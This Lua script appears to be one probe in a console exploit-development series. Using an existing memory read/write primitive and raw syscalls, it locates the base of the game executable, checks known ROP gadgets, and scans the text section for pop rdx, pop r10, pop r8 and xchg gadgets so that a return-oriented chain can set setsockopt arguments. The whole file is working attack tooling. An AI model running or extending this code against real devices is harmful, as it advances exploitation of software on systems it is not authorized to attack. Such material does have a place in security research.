-- CRASH_CLASS: LOW
-- PROBE 91c: Eboot gadget scan — find pop rdx, pop r10, pop r8, xchg
--
-- 91a found pop rsp;ret at +0x9A2 but NOT pop rdx in first 1MB.
-- 91b confirmed RDX is clobbered after setsockopt (marker=99 unchanged).
-- This: dedicated scan of full eboot .text (4.6MB), no threading overhead.

print("=== PROBE 91c: EBOOT GADGET SCAN ===")
print("")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end

local stub=syscall.pipe.fn_addr
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local ebase=uint64(string.format("0x%X%08X",ehi,elo))
local text_sz=rd(inf+0x110) or 0
if text_sz<0 then text_sz=text_sz+0x100000000 end
print("eboot="..string.format("0x%X%08X",ehi,elo).." sz="..string.format("0x%X",text_sz))

-- Verify known gadgets
local function rb(off)
    local v=rd(ebase+off)
    if not v then return nil end
    local pos=off%4
    if pos==0 then return v%256
    elseif pos==1 then return math.floor(v/256)%256
    elseif pos==2 then return math.floor(v/65536)%256
    else return math.floor(v/16777216)%256 end
end

-- Wait, that doesn't work for byte reading - rd reads dword at aligned addr
-- Let me read the dword containing the offset and extract the byte
local function read_byte_at(off)
    local aligned=off-off%4
    local v=rd(ebase+aligned)
    if not v then return nil end
    local shift=off%4
    if shift==0 then return v%256
    elseif shift==1 then return math.floor(v/256)%256
    elseif shift==2 then return math.floor(v/65536)%256
    else return math.floor(v/16777216)%256 end
end

-- Verify PRAX at +0x992 (should be 58 C3 = pop rax; ret)
local v992=read_byte_at(0x992)
local v993=read_byte_at(0x993)
print("verify +0x992: "..string.format("%02X %02X",v992 or 0,v993 or 0).." (expect 58 C3)")

-- Verify PRDI at +0xC9DFE
local vdi0=read_byte_at(0xC9DFE)
local vdi1=read_byte_at(0xC9DFF)
print("verify +0xC9DFE: "..string.format("%02X %02X",vdi0 or 0,vdi1 or 0).." (expect 5F C3)")

-- Verify PRSP at +0x9A2
local v9a2=read_byte_at(0x9A2)
local v9a3=read_byte_at(0x9A3)
print("verify +0x9A2: "..string.format("%02X %02X",v9a2 or 0,v9a3 or 0).." (expect 5C C3)")

-- Hex dump around +0x990 to see what gadgets are nearby
print("")
print("hex dump +0x990..+0x9B0:")
local dump=""
for i=0x990,0x9AF do
    local b=read_byte_at(i)
    if b then dump=dump..string.format("%02X ",b)
    else dump=dump.."?? " end
    if (i-0x990+1)%16==0 then
        print("  +"..string.format("%03X",i-15)..": "..dump)
        dump=""
    end
end

-- ============================================================
-- Full text scan in 256KB chunks, with progress
-- ============================================================
print("")
print("--- GADGET SCAN ---")

-- Scan targets:
-- 5A C3         pop rdx; ret
-- 5A [58-5D] C3 pop rdx; pop XX; ret (avoid 5E=rsi, 5F=rdi for setsockopt)
-- 92 C3         xchg eax,edx; ret
-- 41 5A C3      pop r10; ret
-- 41 58 C3      pop r8; ret
-- 5C C3         pop rsp; ret (for reference)

local results={}
local max_each=3
local p3=nil

local scan_lim=math.min(text_sz,0x500000)
local chunk=0x40000

for base_off=0,scan_lim-1,chunk do
    local end_off=math.min(base_off+chunk-1,scan_lim-4)
    local crashed=false

    for soff=base_off,end_off,4 do
        local v=rd(ebase+soff)
        if not v then
            print("  READ FAILED at +"..string.format("0x%X",soff))
            crashed=true
            break
        end
        local b0=v%256
        local b1=math.floor(v/256)%256
        local b2=math.floor(v/65536)%256
        local b3=math.floor(v/16777216)%256

        local function found(name,off)
            if not results[name] then results[name]={} end
            if #results[name]<max_each then
                table.insert(results[name],off)
            end
        end

        -- boundary with prev dword
        if p3 then
            if p3==0x5A and b0==0xC3 then found("pop_rdx",soff-1) end
            if p3==0x92 and b0==0xC3 then found("xchg_edx",soff-1) end
            if p3==0x5C and b0==0xC3 then found("pop_rsp",soff-1) end
            if p3==0x5A and b0>=0x58 and b0<=0x5D and b1==0xC3 then
                found("pop_rdx_XX",soff-1)
            end
            if p3==0x41 and b0==0x5A and b1==0xC3 then found("pop_r10",soff-1) end
            if p3==0x41 and b0==0x58 and b1==0xC3 then found("pop_r8",soff-1) end
        end

        -- within dword: 2-byte patterns
        if b0==0x5A and b1==0xC3 then found("pop_rdx",soff) end
        if b1==0x5A and b2==0xC3 then found("pop_rdx",soff+1) end
        if b2==0x5A and b3==0xC3 then found("pop_rdx",soff+2) end

        if b0==0x92 and b1==0xC3 then found("xchg_edx",soff) end
        if b1==0x92 and b2==0xC3 then found("xchg_edx",soff+1) end
        if b2==0x92 and b3==0xC3 then found("xchg_edx",soff+2) end

        if b0==0x5C and b1==0xC3 then found("pop_rsp",soff) end
        if b1==0x5C and b2==0xC3 then found("pop_rsp",soff+1) end
        if b2==0x5C and b3==0xC3 then found("pop_rsp",soff+2) end

        -- within dword: 3-byte patterns
        if b0==0x5A and b1>=0x58 and b1<=0x5D and b2==0xC3 then found("pop_rdx_XX",soff) end
        if b1==0x5A and b2>=0x58 and b2<=0x5D and b3==0xC3 then found("pop_rdx_XX",soff+1) end

        if b0==0x41 and b1==0x5A and b2==0xC3 then found("pop_r10",soff) end
        if b1==0x41 and b2==0x5A and b3==0xC3 then found("pop_r10",soff+1) end

        if b0==0x41 and b1==0x58 and b2==0xC3 then found("pop_r8",soff) end
        if b1==0x41 and b2==0x58 and b3==0xC3 then found("pop_r8",soff+1) end

        p3=b3
    end

    local cnt=0
    for _,v in pairs(results) do cnt=cnt+#v end
    print("  chunk +"..string.format("0x%X",base_off)..".."..string.format("0x%X",end_off).." done, "..cnt.." total finds")

    if crashed then
        print("  stopping scan (read failure)")
        break
    end
end

-- ============================================================
-- Results
-- ============================================================
print("")
print("--- RESULTS ---")

local names={"pop_rdx","pop_rdx_XX","xchg_edx","pop_r10","pop_r8","pop_rsp"}
for _,name in ipairs(names) do
    local r=results[name]
    if r and #r>0 then
        local offsets=""
        for i,off in ipairs(r) do
            if i>1 then offsets=offsets..", " end
            offsets=offsets.."+"..string.format("0x%X",off)
        end
        print("  "..name..": "..offsets)
        -- Print bytes at first match for verification
        local off=r[1]
        local bytes=""
        for j=0,5 do
            local b=read_byte_at(off+j)
            if b then bytes=bytes..string.format("%02X ",b)
            else bytes=bytes.."?? " end
        end
        print("    bytes: "..bytes)
    else
        print("  "..name..": NOT FOUND in "..string.format("0x%X",scan_lim))
    end
end

print("")
print("canary="..N(native.fcall_with_rax(stub,20)))
print("=== 91c DONE ===")
